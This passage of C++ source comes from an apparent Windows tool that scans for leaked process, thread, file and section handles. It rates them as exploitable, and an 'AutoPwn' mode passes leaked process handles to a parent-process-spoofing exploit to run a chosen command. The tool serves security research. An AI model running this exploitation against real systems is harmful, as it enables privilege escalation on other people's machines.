     HANDLE dupHandle = NULL;

     // We're going to duplicate the handle so we need first the process handle
     if (!(processHandle = OpenProcess(PROCESS_DUP_HANDLE, FALSE, lhfHandle.UniqueProcessId)))
     {
         _tprintf(_T("   [-] Could not open PID %d!\n"), lhfHandle.UniqueProcessId);
         return FALSE;
     }


     // Duplicate the handle so we can query it
     if (!NT_SUCCESS(NtDuplicateObject(
         processHandle,
         (HANDLE)lhfHandle.Handle,
         GetCurrentProcess(),
         &dupHandle,
         0,
         0,
         DUPLICATE_SAME_ACCESS
     )))
     {
         CloseHandle(processHandle);
         return FALSE;
     }

     CloseHandle(processHandle);

     // We only support process leaked handle explotation at this moment
     if ((_tcscmp(lhfHandle.TypeString, _T("Process")) == 0)) {
         BOOL res = ExploitProcessPpidSpoofing(dupHandle, conf.ExploitCommand);
         CloseHandle(dupHandle);
         return res;
     }

     CloseHandle(dupHandle);
     return FALSE;
 }

/// <summary>
/// Exploitability evaluation process. This function decides  
/// if a handle is exploitable using object granted access permissions.
/// </summary>
/// <param name="lhfHandle">LHF own structure</param>
/// <returns>Nothing</returns>
 void ExploitabilityEvaluation(_In_ LHF_PHANDLE_DESCRIPTION lhfPHandle) {


     if ((_tcscmp(lhfPHandle->TypeString, _T("Process")) == 0)) {

         //PROCESS_CREATE_PROCESS 
         if (lhfPHandle->GrantedAccess & 0x0080) {
             lhfPHandle->HExploitability = EXPLOITABLE;
         }
         //PROCESS_CREATE_THREAD       
         else if (lhfPHandle->GrantedAccess & 0x0002) {
             lhfPHandle->HExploitability = EXPLOITABLE_BUT_NOT_SUPPORTED;
         }
         //PROCESS_DUP_HANDLE 
         else if (lhfPHandle->GrantedAccess & 0x0040) {
             lhfPHandle->HExploitability = EXPLOITABLE_BUT_NOT_SUPPORTED;
         }
         //PROCESS_VM_* 
         else if (lhfPHandle->GrantedAccess & 0x0030) {
             lhfPHandle->HExploitability = EXPLOITABLE_BUT_NOT_SUPPORTED;
         }
         else {
             lhfPHandle->HExploitability = NON_EXPLOITABLE;
         }

         return;
     }

     if ((_tcscmp(lhfPHandle->TypeString, _T("Thread")) == 0)) {

         //THREAD_DIRECT_IMPERSONATION 
         if (lhfPHandle->GrantedAccess & 0x0200) {
             lhfPHandle->HExploitability = EXPLOITABLE_BUT_NOT_SUPPORTED;
         }

         //THREAD_GET_CONTEXT  & THREAD_SET_CONTEXT 
         else if ((lhfPHandle->GrantedAccess & 0x0008) &(lhfPHandle->GrantedAccess & 0x0010)) {
             lhfPHandle->HExploitability = EXPLOITABLE_BUT_NOT_SUPPORTED;
         }

         else if (lhfPHandle->GrantedAccess & 0x0030) {
             lhfPHandle->HExploitability = EXPLOITABLE_BUT_NOT_SUPPORTED;
         }
         else {
             lhfPHandle->HExploitability = NON_EXPLOITABLE;
         }

         return;
     }

     if ((_tcscmp(lhfPHandle->TypeString, _T("File")) == 0)) {

         //WRITE-DATA
         if (lhfPHandle->GrantedAccess & 0x2) {
             lhfPHandle->HExploitability = RESEARCH_NEEDED;
         }
         //WRITE
         if (lhfPHandle->GrantedAccess & 0x6) {
             lhfPHandle->HExploitability = RESEARCH_NEEDED;
         }
         else {
             lhfPHandle->HExploitability = NON_EXPLOITABLE;
         }

         return;
     }

     if ((_tcscmp(lhfPHandle->TypeString, _T("Section")) == 0)) {

         //MAP_WRITE 
         if (lhfPHandle->GrantedAccess & 0x2) {
             lhfPHandle->HExploitability = RESEARCH_NEEDED;
         }
         //DELETE, READ_CONTROL, WRITE_DAC, and WRITE_OWNER standard access rights
         else if (lhfPHandle->GrantedAccess & 0xf0000) {
             lhfPHandle->HExploitability = RESEARCH_NEEDED;
         }
         else {
             lhfPHandle->HExploitability = NON_EXPLOITABLE;
         }

         return;
     }

     if ((_tcscmp(lhfPHandle->TypeString, _T("")) == 0)) {
         lhfPHandle->HExploitability = NON_EXPLOITABLE;
         return;
     }

     lhfPHandle->HExploitability = RESEARCH_NEEDED;
     return;
 }

/// <summary>
/// Main function
/// </summary>
/// <param name="argc"></param>
/// <param name="argv"></param>
/// <returns></returns>
int _tmain(int argc, TCHAR* argv[])
{
    PSYSTEM_HANDLE_INFORMATION_EX systemHandlesList;
    LHF_PHANDLE_DESCRIPTION_LIST lhfHandles = NULL;
    unordered_set<ULONG_PTR> handlesSeen = {};
    unordered_set<ULONG_PTR> suspendedPids = {};

    SetConfig(argc, argv);

    do  {

        //Getting all handlers from all processes
        if (!NT_SUCCESS(GetAllSystemHandlers(&systemHandlesList))) {
            _tprintf(_T("   [-] GetAllSystemHandlers failed!\n"));
            exit(1);
        }

        // Creating our own structure
        if (!GetLhfHandles(systemHandlesList, &lhfHandles)) {
            _tprintf(_T("   [-] GetLhfHandles failed!\n"));
        }

        free(systemHandlesList);

        for (int i = 0; i < lhfHandles->NumberOfLhfHandles; i++)
        {
            //Detection rules
            if (
                // Only show child handles with less integrity level
                lhfHandles->Handles[i].ProcessIntegrity < lhfHandles->Handles[i].ParentProcessIntegrity &&
                
                // We aren't interested in HIGH and SYTEM integrity processes
                lhfHandles->Handles[i].ProcessIntegrity <= MEDIUM_INTEGRITY &&

                //Hide unnamed handles
                !(conf.HideUnnamedHandles && _tcscmp(lhfHandles->Handles[i].Name, _T("")) == 0) &&

                // Don't show Mutant handles
                (_tcscmp(lhfHandles->Handles[i].TypeString, _T("Mutant")) != 0) &&

                // Don't show Event handles
                (_tcscmp(lhfHandles->Handles[i].TypeString, _T("Event")) != 0) &&

                // Don't show Semaphore handles
                (_tcscmp(lhfHandles->Handles[i].TypeString, _T("Semaphore")) != 0) &&
                
                // Don't show own process inherites handles
                lhfHandles->Handles[i].UniqueProcessId != lhfHandles->Handles[i].RemoteProcessId &&

                // Chrome Named Pipe for sandboxed processes
                (StrStrW(lhfHandles->Handles[i].Name, _T("\\mojo.")) == NULL) &&

                // Files and section handles in all users writable paths
                (StrStrW(lhfHandles->Handles[i].Name, _T("2.ro")) == NULL) &&

                // Files and section handles in all users writable paths
                (StrStrW(lhfHandles->Handles[i].Name, _T("1.db")) == NULL) &&

                // Files and section handles in all users writable paths
                (StrStrW(lhfHandles->Handles[i].Name, _T("*AppData*Local*")) == NULL) &&

                // Files and section handles in all users writable paths
                (StrStrW(lhfHandles->Handles[i].Name, _T(".AppData.Local")) == NULL) &&

                // Ancillary Function Driver
                (StrStrW(lhfHandles->Handles[i].Name, _T("\\Device\\Afd")) == NULL) &&

                // Don't show log files
                (StrStrW(lhfHandles->Handles[i].Name, _T(".log")) == NULL)

               ){

                //Let's generate uniq handle id just for not showing it several times
                ULONG_PTR huid = GetUniqHandleId(lhfHandles->Handles[i]);

                //It's a new process/handle? 
                if (handlesSeen.find(huid) == handlesSeen.end()) {
                    //Element is not present
                    handlesSeen.insert(huid);

                    // Let`s check which handles are exploitable
                    ExploitabilityEvaluation(&(lhfHandles->Handles[i]));

                    

                    // Console print
                    if (conf.SingleLine)
                        SingleLinePrint(lhfHandles->Handles[i]);
                    else
                        PrettyPrint(lhfHandles->Handles[i]);

                    if (conf.AutoPwn) {
                        (TryToExploit(lhfHandles->Handles[i])) ?
                            _tprintf(_T("   [+] Exploit Success!\n")) :
                            _tprintf(_T("   [-] AutoPwn exploit failed\n"));
                    }
                } 

                //Suspend process for research pourposes
                if (conf.SuspendType != NULL) {

                    // Only suspend processes when having a specific handle type
                    // Suspend only one time a process
                    if ((_tcscmp(lhfHandles->Handles[i].TypeString, conf.SuspendType) == 0) &&                                          
                        (suspendedPids.find(lhfHandles->Handles[i].UniqueProcessId) == suspendedPids.end())) {

                        SuspendProcessByPid(lhfHandles->Handles[i].UniqueProcessId);
                        suspendedPids.insert(lhfHandles->Handles[i].UniqueProcessId);
                        _tprintf(_T("   [+] Process %d Suspended!\n"), lhfHandles->Handles[i].UniqueProcessId);
                    }
                }
            }
        }

        // Freeing all custom strutures
        LhfFree(lhfHandles);
        Sleep(100);
    } while (conf.ResearchMode);
}

